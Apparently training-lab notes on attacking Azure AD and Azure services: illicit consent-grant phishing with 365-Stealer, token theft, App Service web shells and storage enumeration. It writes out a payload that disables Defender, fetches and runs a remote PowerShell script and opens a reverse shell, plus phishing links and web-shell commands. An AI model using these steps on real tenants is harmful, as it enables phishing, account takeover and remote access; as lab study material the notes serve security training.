# Consent and Permissions
-  Applications can ask users for permissions to access their data. For example, for basic sign-in.

-  If allowed, a normal user can grant consent only for "Low Impact" permissions. In all other cases, admin consent is required.

-  GA, Application Administrator, Cloud Application Administrator and a custom role including 'permission to grant permissions to applications' can provide tenant-wide consent.


-  Consent policies can be set for all users
- Do not allow user consent
- Allow user consent for apps from verified publishers, for selected permissions 
- Only for "Low Impact" permissions for apps from same tenant and verified publisher
- Allow user consents for all apps - Allows consent for apps from other tenants and unverified publishers for Low Impact permissions (Default)
- Custom app consent policy
  
-  'Allow user consent for all apps' is interesting and abusable!

-  Only the permissions that don't need admin consent can be classified as low impact.

-  Permissions required for basic sign-in are openid, profile, email, User.Read and offline_access.

-  That means, if an organization allows user consent for all apps, an employee can grant consent to an app to read the above from their profile.

-  There are some very interesting low impact permissions. For example: User.ReadBasic.All that allows the app to read display name, first and last name, email address, open extensions and photo for all the users!


## Initial Access - Illicit Consent Grant

- Register a Multitenant application studentx in defcorpextcontractors tenant.
- Provide the Redirect URI where you would like to receive tokens. In the lab, it will be the student VM https://172.16.151.X/login/authorized (or 172.16.150.X or 172.16.152.X depending on your location)
- Go to the 'Certificates & secrets' blade and create new Client secret. Copy the client secret before browsing away from the page.
- Go to the 'API permissions' blade and add the following Delegated permissions for Microsoft Graph: ```user.read```, ```User.ReadBasic.All```

Note: In case we want to use Access tokens, following config is required - In the 'Authentication' option of the studentx app, check 'Access tokens (used for implicit flows)' and click on 'Save'. We will use Refresh token so no configuration is required.

- We have user privilege access to the defcorphq tenant. Check if users are allowed to consent to apps.
- Use Azure Portal or the below command from the AzureAD Preview module:
```
(Get- AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAs signedToDefaultUserRole
```

- If the output of above is 'ManagePermissionGrantsForSelf.microsoft- user-default-legacy', that means users can consent for all apps!
- In a real assessment, we simply need to try to know.


### Initial Access - Illicit Consent Grant - 365 Stealer

-   Let's use 365-stealer (https://github.com/AlteredSecurity/365-Stealer) to abuse the consent grant settings!
-   Please note that the attack can be executed using the o365 toolkit (https://github.com/mdsecactivebreach/o365-attack-toolkit) as well. But due to some limitations in the lab, we are not using it.

-   Run xampp Control Panel (Run as administrator) and start Apache on the student VM.
-   Copy the '365-stealer' directory from C:\AzAD\Tools to C:\xampp\htdocs to capture tokens returned by Azure AD.
-   Using the '365-Stealer Configuration' button , configure CLIENTID, REDIRECTURL and CLIENTSECRET
-   Click on 'Run 365-Stealer' to run the tool.
-   Browse to https://localhost using an incognito window and click on 'Read More' in the web page. This gives you the phishing link that is to be sent to the target.

#### Initial Access - Illicit Consent Grant

-  We need to find a way to send the link to targets. We can abuse applications that allow us to contact users in the target organization.
-  We can find applications running on the defcorphq tenant by sub-domain recon.
-  Use MicroBurst to find the applications. We can add permutations like career, hr, users, file, backup to the permuations.txt used by MicroBurst etc.

```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

-  We can also assume that the https://defcorphqcareer.azurewebsites.net application is known as a contractor may have some existing knowledge of the target.


-  Using the 'Need Help' section of the career application running on defcorphq, send the phishing link. https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=dd84e18a-4b33-45c8-b36c-41ccb4624802&scope=https://graph.microsoft.com/.default+openid+offline_access+&redirect_uri=https://172.16.151.X/login/authorized&response_mode=query&sso_reload=true


-   Wait for couple of minutes and browse to http://localhost:82/365-Stealer/yourvictims/ on the attacking machine to get tokens for victims who click on the phishing link.
-   Use the access token with the Graph API to list other users in the tenant.
-   Note that only the permissions that we requested earlier are available with the access token.
We can list all the users thanks to User.ReadBasic.All

```
$Token = 'eyJ0eXAiOiJK...'
$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{ Method = 'GET' Uri    = $URI Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

-   We need to target an Application Administrator to grant consent for better permissions.
-   Ideally, we have to target all the users. For the lab, we can use our earlier enumeration that Application Administrator role is assigned to markdwalden@defcorphq.onmicrosoft.com
-   We need to register a new app (or modify existing one) and now request permissions that need admin consent - mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send
-   Generate a new link using 'Read More' on https://localhost and send an email to the user containing that link (Remember to change the client ID if you register a new application): https://login.microsoftonline.com/common/oauth2/authorizeresponse_type=code&client_id=dd84e18a-4b33-45c8-b36c-41ccb4624802&scope=https://graph.microsoft.com/.default+openid+offline_access+&redirect_uri=https://172.16.151.X/login/authorized&response_mode=query&sso_reload=true

-   Once the user simulation grants consent, we will get the access token of the application administrator.
-   Using the access token of application administrator, we can use 365-stealer to upload macro infected doc files to the user's OneDrive.
-   The user simulation will open these macro infested word files and execute the macro.
-   A licensed version of Office 365 is available on 172.16.1.250 to create doc files
```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office- vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true
IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.x:82/Out-Word.ps1") Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc
-Destination C:\AzAD\Tools\studentx.doc
```


-  Start a listener on the student VM

-  On the student VM, use 365-stealer webconsole or CLI to upload the doc to OneDrive of MarkDWalden@defcorphq.onmicrosoft.com
```
python C:\xampp\htdocs\365-Stealer\365-Stealer.py -- refresh-user MarkDWalden@defcorphq.onmicrosoft.com --upload C:\AzAD\Tools\studentx.doc
```
# App Services

-  "Azure App Service is an HTTP-based service for hosting web applications, REST APIs, and mobile back ends."

-  Supports both Windows and Linux environments.

-  .NET, .NET Core, Java, Ruby, Node.js, PHP, or Python are supported.

-  Each app runs inside a sandbox but isolation depends upon App Service plans

- Apps in Free and Shared tiers run on shared VMs

- Apps in Standard and Premium tiers run on dedicated VMs

-  Windows apps (not running in Windows containers) have local drives, UNC shares, outbound network connectivity (unless restricted), read access to Registry and event logs.

-  In the above case, it is also possible to run a PowerShell script and command shell. But the privileges will be of a the low-privileges workers process that uses a random application pool identity.

-  While there are default security features available with App Service (sandboxing/isolation, encrypted communication etc.), vulnerabilities in the code deployed are abusable.

-  The classic web app vulnerabilities like SQL Injection, Insecure file upload, Injection attacks etc. do not disappear magically :)

- We will discuss the following:
  - Insecure File upload
  - Server Side Template Injection
  - OS Command Injection

-  By abusing an insecure file upload vulnerability in an app service, it is possible to get command execution.

-  As discussed previously, the privileges will be of the low-privilege
worker process.

-  But if the app service uses a Managed Identity, we may have the ability
to have interesting permissions on other Azure resources.

-  After compromising an app service, we can request access tokens for the managed identity.

-  If the app service contains environment variables IDENTITY_HEADER and IDENTITY_ENDPOINT, it has a **managed identity**.

```
http://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
```
-  Get the access token for the managed identity using another webshell https://defcorphqcareer.azurewebsites.net/uploads/studen txtoken.phtml
-  You can find both of the above web shells in the Tools directory.

-     Check the resources available to the managed identity (using the access token and client ID)
```
$token = 'eyJ0eX...'

Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
```
-     Check the permissions of the managed identity on the virtual machine from above:

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11- d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/provide rs/Microsoft.Authorization/permissions?api-version=2015-07-01'


$RequestParams = @{ Method = 'GET' Uri     = $URI Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

Note: There should be no need to use the above code. Get-AZRoleAssignment gives the correct result in case a user's token is used. But throws an error in case token of a manage identity is used.

#### Initial Access - App Service Abuse - Server Side Template Injection (SSTI)

-  SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side.

-  That is, we can get command execution on a server by abusing this.

-  Once again, in case of an Azure App Service, we get privileges only of the worker process but a managed identity may allow us to access other Azure resources.

-  The career app in the defcorphq tenant allows insecure file upload functionality. Abuse the vulnerability and compromise the app service.

-  Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.

#### Initial Access - App Service Abuse - OS Command Injection

-  In case of OS command injection, it is possible to run arbitrary operating system commands on the server where requests are processed.

-  This is usually due to insecure parsing of user input such as parameters,
uploaded files and HTTP requests.

- Same as previously, in case of an Azure App Service, we get privileges only of the worker process but a managed identity may allow us to access other Azure resources.
- Function App (also called Azure Functions) is Azure's 'serverless' solution to run code.
- Languages like C#, Java, PowerShell, Python and more are supported.
- A Function App is supposed to be used to react to an event like:
- HTTP Trigger
- Processing a file upload
- Run code on scheduled time and more
- App service provides the hosting infrastructure for function apps.
- Function apps support Managed Identities.


-  An application in the defcorphq tenant (https://virusscanner.azurewebsites.net) is vulnerable to insecure file upload and OS command injection. Compromise the app service.
-  Check if the service principal for the managed identity of the compromised application has any interesting permissions on other Azure resources.


## Azure Blob Storage

-  Blob storage is used to store unstructured data (like files, videos, audio etc.)
-  There three types of resources in blob storage:
  - Storage account - Unique namespace across Azure. Can be accessed over HTTP or HTTPS.
  - Container in the storage account - 'Folders' in the storage account
  - Blob in a container - Stores data. Three types of blobs - Block, Append and Page blobs.

-  A storage account has globally unique endpoints.
-  Very useful in enumeration too by guessing the storage account names!

#### Azure Blob Storage - Storage account - Authorization

-  There are multiple ways to control access to a storage account:
  - Use Azure AD credentials - Authorize user, group or other identities based on Azure AD authentication. RBAC roles supported!
  - Share Key - Use access keys of the storage account. This provides full access to the storage account
  - Shared Access Signature (SAS) - Time limited and specific permissions!

#### Azure Blob Storage - Storage account - Anonymous Access

-  By default, anonymous access is not allowed for storage accounts.
-  If 'Allow Blob public access' is allowed on the storage account, it is possible to configure anonymous/public read access to :
  - Only the blobs inside containers. Listing of container content not allowed.
  - Contents of container and blobs

#### Azure Blob Storage - Storage account - Storage Explorer

-  Storage explorer is a standalone desktop app to work with Azure storage accounts.
-  It is possible to connect using access keys, SAS urls etc.

#### Initial Access - Storage account - Anonymous Access - Abuse

-  The knowledge that Storage accounts have globally unique endpoints and can allow public read access comes handy!
-  Let's try to find out insecure storage blobs in the defcorphq tenant.

-  We can add permutations like common, backup, code to ```permutations.txt``` in ```C:\AzAD\Tools\Microburst\Misc``` to tune it for defcorphq.
-  We can then use the below command from MicroBurst:
```
Invoke-EnumerateAzureBlobs -Base defcorp
```
